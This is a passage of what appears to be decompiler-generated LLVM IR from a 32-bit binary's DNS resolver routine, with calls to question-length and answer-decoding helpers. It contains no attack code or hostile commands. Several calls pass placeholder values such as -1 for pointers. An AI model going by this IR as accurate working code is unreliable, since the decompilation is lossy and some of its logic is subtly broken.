  %v4_804c1f0 = add i32 %v3_804c1ea, 1
  store i32 %v4_804c1f0, i32* %v2_804c1ea, align 4
  %v0_804c1f4 = load i32, i32* @esp, align 4
  %v1_804c1f4 = add i32 %v0_804c1f4, 56
  %v2_804c1f4 = inttoptr i32 %v1_804c1f4 to i32*
  %v3_804c1f4 = load i32, i32* %v2_804c1f4, align 4
  store i32 %v3_804c1f4, i32* %edx.global-to-local, align 4
  %v2_804c1f8 = add i32 %v0_804c1f4, 44
  %v3_804c1f8 = inttoptr i32 %v2_804c1f8 to i32*
  store i32 %v3_804c1f4, i32* %v3_804c1f8, align 4
  br label %dec_label_pc_804c48c.backedge

dec_label_pc_804c201:                             ; preds = %dec_label_pc_804c1b2, %dec_label_pc_804c1ab
  %v0_804c201 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c201, i32* %eax.global-to-local, align 4
  %v1_804c206 = inttoptr i32 %v0_804c201 to i32*
  store i32 1, i32* %v1_804c206, align 4
  br label %dec_label_pc_804c4c4

dec_label_pc_804c211:                             ; preds = %dec_label_pc_804c1a2
  %v1_804c211 = icmp eq i32 %v3_804c1a2, 0
  %v1_804c213 = icmp eq i1 %v1_804c211, false
  br i1 %v1_804c213, label %dec_label_pc_804c420, label %dec_label_pc_804c219

dec_label_pc_804c219:                             ; preds = %dec_label_pc_804c211
  %v1_804c219 = add i32 %v0_804c188, 120
  %v2_804c219 = inttoptr i32 %v1_804c219 to i32*
  %v3_804c219 = load i32, i32* %v2_804c219, align 4
  %tmp49 = icmp slt i32 %v3_804c219, 1
  br i1 %tmp49, label %dec_label_pc_804c229, label %dec_label_pc_804c220

dec_label_pc_804c220:                             ; preds = %dec_label_pc_804c219
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_804c24855 = add i32 %v0_804c188, 116
  %v3_804c24856 = inttoptr i32 %v2_804c24855 to i32*
  %v4_804c24857 = load i32, i32* %v3_804c24856, align 4
  %v5_804c24858 = sub i32 0, %v4_804c24857
  %v13_804c24862 = and i32 %v4_804c24857, %v5_804c24858
  %v14_804c24863 = icmp slt i32 %v13_804c24862, 0
  %v16_804c24865 = icmp slt i32 %v5_804c24858, 0
  %v2_804c24c66 = icmp eq i1 %v16_804c24865, %v14_804c24863
  br i1 %v2_804c24c66, label %dec_label_pc_804c24e, label %dec_label_pc_804c239

dec_label_pc_804c229:                             ; preds = %dec_label_pc_804c219
  %v0_804c229 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c229, i32* %eax.global-to-local, align 4
  %v1_804c22e = inttoptr i32 %v0_804c229 to i32*
  store i32 4, i32* %v1_804c22e, align 4
  br label %dec_label_pc_804c4c4

dec_label_pc_804c239:                             ; preds = %dec_label_pc_804c220, %dec_label_pc_804c239
  %v0_804c25068 = phi i32 [ %v1_804c245, %dec_label_pc_804c239 ], [ %v1_804c188, %dec_label_pc_804c220 ]
  %v0_804c23967 = phi i32 [ %v0_804c23d, %dec_label_pc_804c239 ], [ %v3_804c1a2, %dec_label_pc_804c220 ]
  %v2_804c239 = add i32 %v0_804c25068, -4
  %v3_804c239 = inttoptr i32 %v2_804c239 to i32*
  store i32 %v0_804c23967, i32* %v3_804c239, align 4
  %v0_804c23a = load i32, i32* @eax, align 4
  %v2_804c23a = add i32 %v0_804c25068, -8
  %v3_804c23a = inttoptr i32 %v2_804c23a to i32*
  store i32 %v0_804c23a, i32* %v3_804c23a, align 4
  %v0_804c23b = load i32, i32* @esi, align 4
  %v2_804c23b = add i32 %v0_804c25068, -12
  %v3_804c23b = inttoptr i32 %v2_804c23b to i32*
  store i32 %v0_804c23b, i32* %v3_804c23b, align 4
  %v2_804c23c = add i32 %v0_804c25068, -16
  %v3_804c23c = inttoptr i32 %v2_804c23c to i32*
  store i32 %v2_804be1e, i32* %v3_804c23c, align 4
  %v0_804c23d = call i32 @__length_question()
  store i32 %v0_804c23d, i32* @eax, align 4
  %v0_804c242 = load i32, i32* @ebx, align 4
  %v1_804c242 = add i32 %v0_804c242, 1
  store i32 %v1_804c242, i32* @ebx, align 4
  %v0_804c243 = load i32, i32* @esi, align 4
  %v2_804c243 = add i32 %v0_804c243, %v0_804c23d
  store i32 %v2_804c243, i32* @esi, align 4
  %v0_804c245 = load i32, i32* @esp, align 4
  %v1_804c245 = add i32 %v0_804c245, 16
  %v2_804c248 = add i32 %v0_804c245, 116
  %v3_804c248 = inttoptr i32 %v2_804c248 to i32*
  %v4_804c248 = load i32, i32* %v3_804c248, align 4
  %v5_804c248 = sub i32 %v1_804c242, %v4_804c248
  %v11_804c248 = xor i32 %v4_804c248, %v1_804c242
  %v12_804c248 = xor i32 %v5_804c248, %v1_804c242
  %v13_804c248 = and i32 %v12_804c248, %v11_804c248
  %v14_804c248 = icmp slt i32 %v13_804c248, 0
  %v16_804c248 = icmp slt i32 %v5_804c248, 0
  %v2_804c24c = icmp eq i1 %v16_804c248, %v14_804c248
  br i1 %v2_804c24c, label %dec_label_pc_804c24e, label %dec_label_pc_804c239

dec_label_pc_804c24e:                             ; preds = %dec_label_pc_804c239, %dec_label_pc_804c220
  %v0_804c250.lcssa = phi i32 [ %v1_804c188, %dec_label_pc_804c220 ], [ %v1_804c245, %dec_label_pc_804c239 ]
  store i32 0, i32* @ebx, align 4
  %v1_804c250 = add i32 %v0_804c250.lcssa, 27
  %v2_804c250 = inttoptr i32 %v1_804c250 to i8*
  store i8 1, i8* %v2_804c250, align 1
  %v0_804c37e.pre = load i32, i32* @ebx, align 4
  %v1_804c37e.pre = load i32, i32* @esp, align 4
  %v2_804c37e69 = add i32 %v1_804c37e.pre, 104
  %v3_804c37e70 = inttoptr i32 %v2_804c37e69 to i32*
  %v4_804c37e71 = load i32, i32* %v3_804c37e70, align 4
  %v5_804c37e72 = sub i32 %v0_804c37e.pre, %v4_804c37e71
  %v11_804c37e74 = xor i32 %v4_804c37e71, %v0_804c37e.pre
  %v12_804c37e75 = xor i32 %v5_804c37e72, %v0_804c37e.pre
  %v13_804c37e76 = and i32 %v12_804c37e75, %v11_804c37e74
  %v14_804c37e77 = icmp slt i32 %v13_804c37e76, 0
  %v16_804c37e79 = icmp slt i32 %v5_804c37e72, 0
  %v2_804c38280 = icmp eq i1 %v16_804c37e79, %v14_804c37e77
  br i1 %v2_804c38280, label %dec_label_pc_804c38e, label %dec_label_pc_804c384.lr.ph

dec_label_pc_804c384.lr.ph:                       ; preds = %dec_label_pc_804c24e
  %v0_804c384.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c384

dec_label_pc_804c25a:                             ; preds = %dec_label_pc_804c384
  %v1_804c25a = add i32 %v0_804c25a81, 116
  store i32 %v1_804c25a, i32* %eax.global-to-local, align 4
  %v2_804c25e = add i32 %v0_804c25a81, -4
  %v3_804c25e = inttoptr i32 %v2_804c25e to i32*
  store i32 %v1_804c25a, i32* %v3_804c25e, align 4
  %v3_804c25f = load i32, i32* %v3_804c384, align 4
  %v5_804c25f = add i32 %v0_804c25a81, -8
  %v6_804c25f = inttoptr i32 %v5_804c25f to i32*
  store i32 %v3_804c25f, i32* %v6_804c25f, align 4
  %v0_804c263 = load i32, i32* @esi, align 4
  %v2_804c263 = add i32 %v0_804c25a81, -12
  %v3_804c263 = inttoptr i32 %v2_804c263 to i32*
  store i32 %v0_804c263, i32* %v3_804c263, align 4
  %v2_804c264 = add i32 %v0_804c25a81, -16
  %v3_804c264 = inttoptr i32 %v2_804c264 to i32*
  store i32 %v2_804be1e, i32* %v3_804c264, align 4
  %v0_804c265 = call i32 @__decode_answer()
  store i32 %v0_804c265, i32* @eax, align 4
  %v1_804c26a = load i32, i32* @esp, align 4
  %v2_804c26a = add i32 %v1_804c26a, 68
  %v3_804c26a = inttoptr i32 %v2_804c26a to i32*
  store i32 %v0_804c265, i32* %v3_804c26a, align 4
  %v0_804c26e = load i32, i32* @esp, align 4
  %v1_804c26e = add i32 %v0_804c26e, 16
  %v2_804c271 = icmp slt i32 %v0_804c265, 0
  %v1_804c273 = icmp eq i1 %v2_804c271, false
  br i1 %v1_804c273, label %dec_label_pc_804c28d, label %dec_label_pc_804c275

dec_label_pc_804c275:                             ; preds = %dec_label_pc_804c25a
  %v0_804c275 = load i32, i32* @ebx, align 4
  %v1_804c275 = icmp eq i32 %v0_804c275, 0
  br i1 %v1_804c275, label %dec_label_pc_804c420, label %dec_label_pc_804c27d

dec_label_pc_804c27d:                             ; preds = %dec_label_pc_804c275
  %v1_804c27d = add i32 %v0_804c26e, 100
  %v2_804c27d = inttoptr i32 %v1_804c27d to i32*
  %v3_804c27d = load i32, i32* %v2_804c27d, align 4
  %v4_804c27d = icmp eq i32 %v3_804c27d, 0
  br i1 %v4_804c27d, label %dec_label_pc_804c420, label %dec_label_pc_804c38e

dec_label_pc_804c28d:                             ; preds = %dec_label_pc_804c25a
  %v1_804c28d = add i32 %v0_804c26e, 43
  %v2_804c28d = inttoptr i32 %v1_804c28d to i8*
  %v3_804c28d = load i8, i8* %v2_804c28d, align 1
  %v4_804c28d = icmp eq i8 %v3_804c28d, 0
  br i1 %v4_804c28d, label %dec_label_pc_804c32e, label %dec_label_pc_804c298

dec_label_pc_804c298:                             ; preds = %dec_label_pc_804c28d
  %v0_804c298 = load i32, i32* @edi, align 4
  %v1_804c298 = add i32 %v0_804c298, 28
  %v2_804c298 = inttoptr i32 %v1_804c298 to i32*
  %v3_804c298 = load i32, i32* %v2_804c298, align 4
  store i32 %v3_804c298, i32* %eax.global-to-local, align 4
  %v2_804c29b = add i32 %v0_804c26e, 160
  %v3_804c29b = inttoptr i32 %v2_804c29b to i32*
  store i32 %v3_804c298, i32* %v3_804c29b, align 4
  %v0_804c2a2 = load i32, i32* @edi, align 4
  %v1_804c2a2 = add i32 %v0_804c2a2, 32
  %v2_804c2a2 = inttoptr i32 %v1_804c2a2 to i32*
  %v3_804c2a2 = load i32, i32* %v2_804c2a2, align 4
  store i32 %v3_804c2a2, i32* %eax.global-to-local, align 4
  %v1_804c2a5 = load i32, i32* @esp, align 4
  %v2_804c2a5 = add i32 %v1_804c2a5, 148
  %v3_804c2a5 = inttoptr i32 %v2_804c2a5 to i32*
  store i32 %v3_804c2a2, i32* %v3_804c2a5, align 4
  %v0_804c2ac = load i32, i32* @edi, align 4
  %v1_804c2ac = add i32 %v0_804c2ac, 36
  %v2_804c2ac = inttoptr i32 %v1_804c2ac to i32*
  %v3_804c2ac = load i32, i32* %v2_804c2ac, align 4
  store i32 %v3_804c2ac, i32* %eax.global-to-local, align 4
  %v1_804c2af = load i32, i32* @esp, align 4
  %v2_804c2af = add i32 %v1_804c2af, 152
  %v3_804c2af = inttoptr i32 %v2_804c2af to i32*
  store i32 %v3_804c2ac, i32* %v3_804c2af, align 4
  %v0_804c2b6 = load i32, i32* @ecx, align 4
  %v1_804c2b6 = load i32, i32* @esp, align 4
  %v2_804c2b6 = add i32 %v1_804c2b6, -4
  %v3_804c2b6 = inttoptr i32 %v2_804c2b6 to i32*
  store i32 %v0_804c2b6, i32* %v3_804c2b6, align 4
  %v1_804c2b7 = add i32 %v1_804c2b6, -8
  %v2_804c2b7 = inttoptr i32 %v1_804c2b7 to i32*
  store i32 40, i32* %v2_804c2b7, align 4
  %v1_804c2b9 = add i32 %v1_804c2b6, 116
  store i32 %v1_804c2b9, i32* %edx.global-to-local, align 4
  %v2_804c2bd = add i32 %v1_804c2b6, -12
  %v3_804c2bd = inttoptr i32 %v2_804c2bd to i32*
  store i32 %v1_804c2b9, i32* %v3_804c2bd, align 4
  %v0_804c2be = load i32, i32* @edi, align 4
  %v2_804c2be = add i32 %v1_804c2b6, -16
  %v3_804c2be = inttoptr i32 %v2_804c2be to i32*
  store i32 %v0_804c2be, i32* %v3_804c2be, align 4
  %v5_804c2bf = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804beac, i32 %v3_804bf0b)
  store i32 %v5_804c2bf, i32* %eax.global-to-local, align 4
  %v0_804c2c4 = load i32, i32* @edi, align 4
  %v1_804c2c4 = add i32 %v0_804c2c4, 4
  %v2_804c2c4 = inttoptr i32 %v1_804c2c4 to i32*
  %v3_804c2c4 = load i32, i32* %v2_804c2c4, align 4
  store i32 %v3_804c2c4, i32* %eax.global-to-local, align 4
  %v0_804c2c7 = load i32, i32* @esp, align 4
  %v1_804c2c7 = add i32 %v0_804c2c7, 16
  %v9_804c2ca = icmp eq i32 %v3_804c2c4, 24
  br i1 %v9_804c2ca, label %dec_label_pc_804c298.dec_label_pc_804c2f1_crit_edge, label %dec_label_pc_804c2cf

dec_label_pc_804c298.dec_label_pc_804c2f1_crit_edge: ; preds = %dec_label_pc_804c298
  %.pre24 = add i32 %v0_804c2c7, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_804c2f1.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_804c2f1

dec_label_pc_804c2cf:                             ; preds = %dec_label_pc_804c298
  %v1_804c2cf = add i32 %v0_804c2c4, 28
  %v2_804c2cf = inttoptr i32 %v1_804c2cf to i32*
  %v3_804c2cf = load i32, i32* %v2_804c2cf, align 4
  %v4_804c2cf = icmp eq i32 %v3_804c2cf, 0
  br i1 %v4_804c2cf, label %dec_label_pc_804c38e, label %dec_label_pc_804c2d9

dec_label_pc_804c2d9:                             ; preds = %dec_label_pc_804c2cf
  %v1_804c2d9 = add i32 %v0_804c2c7, 260
  %v2_804c2d9 = inttoptr i32 %v1_804c2d9 to i32*
  %v3_804c2d9 = load i32, i32* %v2_804c2d9, align 4
  %v12_804c2d9 = icmp eq i32 %v3_804c2d9, 1
  br i1 %v12_804c2d9, label %dec_label_pc_804c2f1, label %dec_label_pc_804c2e3

dec_label_pc_804c2e3:                             ; preds = %dec_label_pc_804c2d9
  %v12_804c2e3 = icmp eq i32 %v3_804c2d9, 28
  %v1_804c2eb = icmp eq i1 %v12_804c2e3, false
  br i1 %v1_804c2eb, label %dec_label_pc_804c38e, label %dec_label_pc_804c2f1

dec_label_pc_804c2f1:                             ; preds = %dec_label_pc_804c298.dec_label_pc_804c2f1_crit_edge, %dec_label_pc_804c2e3, %dec_label_pc_804c2d9
  %v4_804c2f1 = phi i32 [ %v4_804c2f1.pre, %dec_label_pc_804c298.dec_label_pc_804c2f1_crit_edge ], [ %v3_804c2d9, %dec_label_pc_804c2e3 ], [ 1, %dec_label_pc_804c2d9 ]
  %v15_804c2f1 = icmp eq i32 %v3_804c2c4, %v4_804c2f1
  br i1 %v15_804c2f1, label %dec_label_pc_804c306, label %dec_label_pc_804c2fa

dec_label_pc_804c2fa:                             ; preds = %dec_label_pc_804c2f1
  %v1_804c2fd = inttoptr i32 %v0_804c2c4 to i32*
  %v2_804c2fd = load i32, i32* %v1_804c2fd, align 4
  %v5_804c2fd = inttoptr i32 %v0_804c2c7 to i32*
  store i32 %v2_804c2fd, i32* %v5_804c2fd, align 4
  %v1_804c2ff = call i32 @free(i32 -1)
  store i32 %v1_804c2ff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c376

dec_label_pc_804c306:                             ; preds = %dec_label_pc_804c2f1
  %v0_804c306 = load i32, i32* @ebx, align 4
  %v1_804c308 = sub i32 -1, %v0_804c306
  store i32 %v1_804c308, i32* %eax.global-to-local, align 4
  %v2_804c30a = add i32 %v0_804c2c7, 120
  %v3_804c30a = inttoptr i32 %v2_804c30a to i32*
  %v4_804c30a = load i32, i32* %v3_804c30a, align 4
  %v5_804c30a = add i32 %v4_804c30a, %v1_804c308
  store i32 %v5_804c30a, i32* %eax.global-to-local, align 4
  %v2_804c30e = add i32 %v0_804c2c4, 36
  %v3_804c30e = inttoptr i32 %v2_804c30e to i32*
  store i32 %v5_804c30a, i32* %v3_804c30e, align 4
  %v0_804c311 = load i32, i32* @edi, align 4
  %v1_804c311 = add i32 %v0_804c311, 16
  %v2_804c311 = inttoptr i32 %v1_804c311 to i32*
  %v3_804c311 = load i32, i32* %v2_804c311, align 4
  %v1_804c314 = add i32 %v3_804c311, 4
  store i32 %v1_804c314, i32* %eax.global-to-local, align 4
  %v2_804c317 = add i32 %v0_804c311, 36
  %v3_804c317 = inttoptr i32 %v2_804c317 to i32*
  %v4_804c317 = load i32, i32* %v3_804c317, align 4
  %v7_804c317 = mul i32 %v4_804c317, %v1_804c314
  store i32 %v7_804c317, i32* %eax.global-to-local, align 4
  %v2_804c31b = add i32 %v0_804c311, 32
  %v3_804c31b = inttoptr i32 %v2_804c31b to i32*
  %v4_804c31b = load i32, i32* %v3_804c31b, align 4
  %v6_804c31e = icmp ugt i32 %v7_804c317, %v4_804c31b
  br i1 %v6_804c31e, label %dec_label_pc_804c306.dec_label_pc_804c38e.loopexit_crit_edge, label %dec_label_pc_804c320

dec_label_pc_804c306.dec_label_pc_804c38e.loopexit_crit_edge: ; preds = %dec_label_pc_804c306
  %v0_804c38e.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c38e

dec_label_pc_804c320:                             ; preds = %dec_label_pc_804c306
  store i32 0, i32* %v3_804c317, align 4
  %v0_804c327 = load i32, i32* @esp, align 4
  %v1_804c327 = add i32 %v0_804c327, 27
  %v2_804c327 = inttoptr i32 %v1_804c327 to i8*
  store i8 0, i8* %v2_804c327, align 1
  %v1_804c379.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c379

dec_label_pc_804c32e:                             ; preds = %dec_label_pc_804c28d
  %v1_804c331 = add i32 %v0_804c26e, 132
  %v2_804c331 = inttoptr i32 %v1_804c331 to i32*
  %v3_804c331 = load i32, i32* %v2_804c331, align 4
  %v6_804c331 = inttoptr i32 %v0_804c26e to i32*
  store i32 %v3_804c331, i32* %v6_804c331, align 4
  %v1_804c338 = call i32 @free(i32 -1)
  store i32 %v1_804c338, i32* %eax.global-to-local, align 4
  %v0_804c33d = load i32, i32* @esp, align 4
  %v1_804c33d = add i32 %v0_804c33d, 16
  %v1_804c340 = add i32 %v0_804c33d, 260
  %v2_804c340 = inttoptr i32 %v1_804c340 to i32*
  %v3_804c340 = load i32, i32* %v2_804c340, align 4
  store i32 %v3_804c340, i32* %eax.global-to-local, align 4
  %v1_804c347 = add i32 %v0_804c33d, 136
  %v2_804c347 = inttoptr i32 %v1_804c347 to i32*
  %v3_804c347 = load i32, i32* %v2_804c347, align 4
  %v15_804c347 = icmp eq i32 %v3_804c347, %v3_804c340
  %v1_804c34b = icmp eq i1 %v15_804c347, false
  br i1 %v1_804c34b, label %dec_label_pc_804c379, label %dec_label_pc_804c34d

dec_label_pc_804c34d:                             ; preds = %dec_label_pc_804c32e
  %v0_804c34d = load i32, i32* @edi, align 4
  %v1_804c34d = add i32 %v0_804c34d, 16
  %v2_804c34d = inttoptr i32 %v1_804c34d to i32*
  %v3_804c34d = load i32, i32* %v2_804c34d, align 4
  store i32 %v3_804c34d, i32* %eax.global-to-local, align 4
  %v2_804c350 = add i32 %v0_804c33d, 148
  %v3_804c350 = inttoptr i32 %v2_804c350 to i32*
  %v4_804c350 = load i32, i32* %v3_804c350, align 4
  %v15_804c350 = icmp eq i32 %v3_804c34d, %v4_804c350
  %v1_804c357 = icmp eq i1 %v15_804c350, false
  br i1 %v1_804c357, label %dec_label_pc_804c413, label %dec_label_pc_804c35d

dec_label_pc_804c35d:                             ; preds = %dec_label_pc_804c34d
  %v0_804c35d = load i32, i32* @edx, align 4
  %v2_804c35d = add i32 %v0_804c33d, 12
  %v3_804c35d = inttoptr i32 %v2_804c35d to i32*
  store i32 %v0_804c35d, i32* %v3_804c35d, align 4
  %v0_804c35e = load i32, i32* %eax.global-to-local, align 4
  %v2_804c35e = add i32 %v0_804c33d, 8
  %v3_804c35e = inttoptr i32 %v2_804c35e to i32*
  store i32 %v0_804c35e, i32* %v3_804c35e, align 4
  %v1_804c35f = add i32 %v0_804c33d, 152
  %v2_804c35f = inttoptr i32 %v1_804c35f to i32*
  %v3_804c35f = load i32, i32* %v2_804c35f, align 4
  %v5_804c35f = add i32 %v0_804c33d, 4
  %v6_804c35f = inttoptr i32 %v5_804c35f to i32*
  store i32 %v3_804c35f, i32* %v6_804c35f, align 4
  %v0_804c366 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c366 = load i32, i32* @edi, align 4
  %v2_804c366 = add i32 %v1_804c366, 36
  %v3_804c366 = inttoptr i32 %v2_804c366 to i32*
  %v4_804c366 = load i32, i32* %v3_804c366, align 4
  %v7_804c366 = mul i32 %v4_804c366, %v0_804c366
  store i32 %v7_804c366, i32* %eax.global-to-local, align 4
  %v2_804c36a = add i32 %v1_804c366, 28
  %v3_804c36a = inttoptr i32 %v2_804c36a to i32*
  %v4_804c36a = load i32, i32* %v3_804c36a, align 4
  %v5_804c36a = add i32 %v4_804c36a, %v7_804c366
  store i32 %v5_804c36a, i32* %eax.global-to-local, align 4
  %v3_804c36d = inttoptr i32 %v0_804c33d to i32*
  store i32 %v5_804c36a, i32* %v3_804c36d, align 4
  %v5_804c36e = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804beac, i32 %v3_804bf0b)
  store i32 %v5_804c36e, i32* %eax.global-to-local, align 4
  %v0_804c373 = load i32, i32* @edi, align 4
  %v1_804c373 = add i32 %v0_804c373, 36
  %v2_804c373 = inttoptr i32 %v1_804c373 to i32*
  %v3_804c373 = load i32, i32* %v2_804c373, align 4
  %v4_804c373 = add i32 %v3_804c373, 1
  store i32 %v4_804c373, i32* %v2_804c373, align 4
  br label %dec_label_pc_804c376

dec_label_pc_804c376:                             ; preds = %dec_label_pc_804c2fa, %dec_label_pc_804c35d
  %v0_804c376 = load i32, i32* @esp, align 4
  %v1_804c376 = add i32 %v0_804c376, 16
  br label %dec_label_pc_804c379

dec_label_pc_804c379:                             ; preds = %dec_label_pc_804c32e, %dec_label_pc_804c320, %dec_label_pc_804c376
  %v1_804c379 = phi i32 [ %v1_804c33d, %dec_label_pc_804c32e ], [ %v1_804c379.pre, %dec_label_pc_804c320 ], [ %v1_804c376, %dec_label_pc_804c376 ]
  %v0_804c379 = load i32, i32* @esi, align 4
  %v2_804c379 = add i32 %v1_804c379, 52
  %v3_804c379 = inttoptr i32 %v2_804c379 to i32*
  %v4_804c379 = load i32, i32* %v3_804c379, align 4
  %v5_804c379 = add i32 %v4_804c379, %v0_804c379
  store i32 %v5_804c379, i32* @esi, align 4
  %v0_804c37d = load i32, i32* @ebx, align 4
  %v1_804c37d = add i32 %v0_804c37d, 1
  store i32 %v1_804c37d, i32* @ebx, align 4
  %v2_804c37e = add i32 %v1_804c379, 104
  %v3_804c37e = inttoptr i32 %v2_804c37e to i32*
  %v4_804c37e = load i32, i32* %v3_804c37e, align 4
  %v5_804c37e = sub i32 %v1_804c37d, %v4_804c37e
  %v11_804c37e = xor i32 %v4_804c37e, %v1_804c37d
  %v12_804c37e = xor i32 %v5_804c37e, %v1_804c37d
  %v13_804c37e = and i32 %v12_804c37e, %v11_804c37e
  %v14_804c37e = icmp slt i32 %v13_804c37e, 0
  %v16_804c37e = icmp slt i32 %v5_804c37e, 0
  %v2_804c382 = icmp eq i1 %v16_804c37e, %v14_804c37e
  br i1 %v2_804c382, label %dec_label_pc_804c38e, label %dec_label_pc_804c384

dec_label_pc_804c384:                             ; preds = %dec_label_pc_804c384.lr.ph, %dec_label_pc_804c379
  %v0_804c384 = phi i32 [ %v0_804c384.pre, %dec_label_pc_804c384.lr.ph ], [ %v5_804c379, %dec_label_pc_804c379 ]
  %v0_804c25a81 = phi i32 [ %v1_804c37e.pre, %dec_label_pc_804c384.lr.ph ], [ %v1_804c379, %dec_label_pc_804c379 ]
  %v2_804c384 = add i32 %v0_804c25a81, 16
  %v3_804c384 = inttoptr i32 %v2_804c384 to i32*
  %v4_804c384 = load i32, i32* %v3_804c384, align 4
  %v5_804c384 = sub i32 %v0_804c384, %v4_804c384
  %v11_804c384 = xor i32 %v4_804c384, %v0_804c384
  %v12_804c384 = xor i32 %v5_804c384, %v0_804c384
  %v13_804c384 = and i32 %v12_804c384, %v11_804c384
  %v14_804c384 = icmp slt i32 %v13_804c384, 0
  %v16_804c384 = icmp slt i32 %v5_804c384, 0
  %v2_804c388 = icmp eq i1 %v16_804c384, %v14_804c384
  br i1 %v2_804c388, label %dec_label_pc_804c38e, label %dec_label_pc_804c25a

dec_label_pc_804c38e:                             ; preds = %dec_label_pc_804c27d, %dec_label_pc_804c24e, %dec_label_pc_804c379, %dec_label_pc_804c2cf, %dec_label_pc_804c2e3, %dec_label_pc_804c384, %dec_label_pc_804c306.dec_label_pc_804c38e.loopexit_crit_edge
  %v0_804c38e = phi i32 [ %v0_804c38e.pre.pre, %dec_label_pc_804c306.dec_label_pc_804c38e.loopexit_crit_edge ], [ %v1_804c37e.pre, %dec_label_pc_804c24e ], [ %v1_804c379, %dec_label_pc_804c379 ], [ %v1_804c2c7, %dec_label_pc_804c2cf ], [ %v1_804c2c7, %dec_label_pc_804c2e3 ], [ %v0_804c25a81, %dec_label_pc_804c384 ], [ %v1_804c26e, %dec_label_pc_804c27d ]
  %v1_804c391 = add i32 %v0_804c38e, 20
  %v2_804c391 = inttoptr i32 %v1_804c391 to i32*
  %v3_804c391 = load i32, i32* %v2_804c391, align 4
  %v5_804c391 = add i32 %v0_804c38e, -16
  %v6_804c391 = inttoptr i32 %v5_804c391 to i32*
  store i32 %v3_804c391, i32* %v6_804c391, align 4
  %v1_804c395 = call i32 @__libc_close(i32 -1)
  store i32 %v1_804c395, i32* %eax.global-to-local, align 4
  %v0_804c39a = load i32, i32* @esp, align 4
  %v1_804c39d = add i32 %v0_804c39a, 272
  %v2_804c39d = inttoptr i32 %v1_804c39d to i32*
  %v3_804c39d = load i32, i32* %v2_804c39d, align 4
  %v4_804c39d = icmp eq i32 %v3_804c39d, 0
  br i1 %v4_804c39d, label %dec_label_pc_804c3b2, label %dec_label_pc_804c3a7

dec_label_pc_804c3a7:                             ; preds = %dec_label_pc_804c38e
  store i32 %v3_804c39d, i32* %edx.global-to-local, align 4
  %v2_804c3ae = inttoptr i32 %v3_804c39d to i32*
  store i32 %v2_804be1e, i32* %v2_804c3ae, align 4
  %v0_804c3be.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c3be

dec_label_pc_804c3b2:                             ; preds = %dec_label_pc_804c38e
  %v3_804c3b5 = inttoptr i32 %v0_804c39a to i32*
  store i32 %v2_804be1e, i32* %v3_804c3b5, align 4
  %v1_804c3b6 = call i32 @free(i32 -1)
  store i32 %v1_804c3b6, i32* %eax.global-to-local, align 4
  %v0_804c3bb = load i32, i32* @esp, align 4
  %v1_804c3bb = add i32 %v0_804c3bb, 16
  br label %dec_label_pc_804c3be

dec_label_pc_804c3be:                             ; preds = %dec_label_pc_804c3a7, %dec_label_pc_804c3b2
  %v0_804c3be = phi i32 [ %v0_804c3be.pre, %dec_label_pc_804c3a7 ], [ %v1_804c3bb, %dec_label_pc_804c3b2 ]
  %v1_804c3c1 = add i32 %v0_804c3be, 12
  %v2_804c3c1 = inttoptr i32 %v1_804c3c1 to i32*
  %v3_804c3c1 = load i32, i32* %v2_804c3c1, align 4
  %v5_804c3c1 = add i32 %v0_804c3be, -16
  %v6_804c3c1 = inttoptr i32 %v5_804c3c1 to i32*
  store i32 %v3_804c3c1, i32* %v6_804c3c1, align 4
  %v1_804c3c5 = call i32 @free(i32 -1)
  store i32 %v1_804c3c5, i32* @eax, align 4
  %v0_804c3ca = load i32, i32* @esp, align 4
  %v1_804c3cd = add i32 %v0_804c3ca, 8
  %v2_804c3cd = inttoptr i32 %v1_804c3cd to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v2_804c3cd, align 4
  %v1_804c3d2 = add i32 %v0_804c3ca, 4
  %v2_804c3d2 = inttoptr i32 %v1_804c3d2 to i32*
  store i32 134526427, i32* %v2_804c3d2, align 4
  %v1_804c3d7 = add i32 %v0_804c3ca, 200
  store i32 %v1_804c3d7, i32* %ebx.global-to-local, align 4
  %v3_804c3de = inttoptr i32 %v0_804c3ca to i32*
  store i32 %v1_804c3d7, i32* %v3_804c3de, align 4
  %v2_804c3df = call i32 @__pthread_return_void(i32 -1, i32 %v15_804beac)
  store i32 %v2_804c3df, i32* %eax.global-to-local, align 4
  %v0_804c3e4 = load i32, i32* @esp, align 4
  %v1_804c3e4 = inttoptr i32 %v0_804c3e4 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v1_804c3e4, align 4
  %v1_804c3eb = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c3eb, i32* %eax.global-to-local, align 4
  %v0_804c3f0 = load i32, i32* @esp, align 4
  %v1_804c3f0 = add i32 %v0_804c3f0, 56
  %v2_804c3f0 = inttoptr i32 %v1_804c3f0 to i32*
  %v3_804c3f0 = load i32, i32* %v2_804c3f0, align 4
  store i32 %v3_804c3f0, i32* @eax, align 4
  %v1_804c3f4 = add i32 %v0_804c3f0, 72
  %v2_804c3f4 = inttoptr i32 %v1_804c3f4 to i32*
  %v3_804c3f4 = load i32, i32* %v2_804c3f4, align 4
  store i32 %v3_804c3f4, i32* %edx.global-to-local, align 4
  %v1_804c3f8 = inttoptr i32 %v0_804c3f0 to i32*
  %v3_804c3f8 = add i32 %v0_804c3f0, 4
  %v1_804c3f9 = inttoptr i32 %v3_804c3f8 to i32*
  store i32 1, i32* %v1_804c3f9, align 4
  %v0_804c3fc = load i32, i32* @eax, align 4
  %v1_804c3fc = sext i32 %v0_804c3fc to i64
  store i64 %v1_804c3fc, i64* @global_var_8052540.85, align 64
  %v0_804c401 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c401 = trunc i32 %v0_804c401 to i16
  store i16 %v1_804c401, i16* @global_var_805215c.86, align 4
  %v0_804c408 = load i32, i32* %ebx.global-to-local, align 4
